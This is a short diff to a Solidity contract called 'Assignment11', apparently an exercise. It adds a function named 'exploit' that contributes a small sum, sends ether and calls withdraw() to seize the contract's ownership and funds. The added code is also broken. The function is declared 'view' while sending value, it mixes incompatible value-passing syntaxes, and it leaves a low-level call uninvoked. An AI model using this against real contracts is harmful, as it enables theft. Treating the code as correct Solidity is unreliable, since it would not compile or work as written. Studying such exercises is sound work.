@@ -35,4 +35,12 @@ contract Assignment11 {
         require(msg.value > 0 && contributions[msg.sender] > 0);
         owner = msg.sender;
     }
+
+    function exploit(address _attacker) public view{
+        contribute.value(0.00001)(_attacker); 
+        address(this).call{value: 1 ether};
+        withdraw();
+
+
+    }
 }
